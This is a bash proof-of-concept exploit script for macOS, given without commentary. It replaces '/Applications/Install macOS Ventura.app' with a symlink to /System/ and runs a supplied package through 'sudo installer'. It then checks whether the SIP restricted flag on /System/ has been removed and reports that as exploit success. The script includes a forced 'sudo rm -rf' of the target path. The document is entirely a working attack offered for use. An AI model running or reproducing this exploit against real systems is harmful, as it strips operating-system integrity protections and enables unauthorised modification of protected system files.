#!/bin/bash

TARGET_DIR="/System/"
PKG_PATH=$1
DROP_PATH="/Applications/Install macOS Ventura.app"
MOUNT_DIR="/"
PKG_NAME="${PKG_PATH##*/}"

if [ $# -eq 0 ]; then
    echo "No arguments provided. Usage: $0 <PKG_PATH>"
    exit 1
fi

if [ -e "$DROP_PATH" ]; then
    echo "[*] cleaning previous installation..."
    sudo rm -rf "$DROP_PATH"
fi

echo "[*] creating symlink..."
ln -sf "$TARGET_DIR" "$DROP_PATH"

if [ $? -eq 0 ]; then
    echo "[+] symlink [$DROP_PATH] -> [$TARGET_DIR] created successfully!"
else
    echo "[-] failed to create symlink [$DROP_PATH] -> [$TARGET_DIR]"
fi

echo "[*] executing the exploit..."
sudo installer -pkg $PKG_PATH -target $MOUNT_DIR > /dev/null 

# extract the restricted flag
restricted_flag=$(ls -ldO "$TARGET_DIR" | awk '{print $5}')

# Check if the inodes are different
if [ "$restricted_flag" == "-" ]; then
    echo "[+] exploit completed successfully!"
else
    echo "[-] exploit has failed"
fi
